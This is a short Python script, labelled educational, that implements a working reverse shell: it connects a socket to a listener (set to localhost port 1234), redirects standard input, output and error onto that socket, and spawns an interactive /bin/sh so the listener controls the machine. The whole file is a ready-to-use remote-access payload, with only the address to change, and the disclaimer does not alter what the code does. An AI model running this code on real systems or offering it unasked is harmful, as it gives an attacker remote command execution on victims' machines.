#!/usr/bin/env python3
"""
🐚 The Sneaky Reverse Shell
🚨 EDUCATIONAL USE ONLY 🚨
This script connects BACK to a listener (like netcat) and gives it control.
Do not use this malicious purposes! 🛑
"""

import socket
import subprocess
import os

def reverse_shell():
    print("\n☠️  Attempting Reverse Shell Connection...")
    
    try:
        # 1️⃣ Create Socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # 2️⃣ Connect to Hacker (Localhost for testing)
        target_ip = '127.0.0.1'
        target_port = 1234
        print(f"   🔌 Dialing {target_ip}:{target_port}...")
        
        s.connect((target_ip, target_port))
        print("   ✅ Connected!")

        # 3️⃣ Redirect Streams (The Magic/Dangerous part) 🎩
        # We replace the script's Input/Output with the Socket
        # 0 = stdin, 1 = stdout, 2 = stderr
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # 4️⃣ Spawn Shell
        # This shell now takes orders from the socket!
        print("   🐚 Spawning shell...")
        subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"   ❌ Failed: {e}")

if __name__ == "__main__":
    reverse_shell()
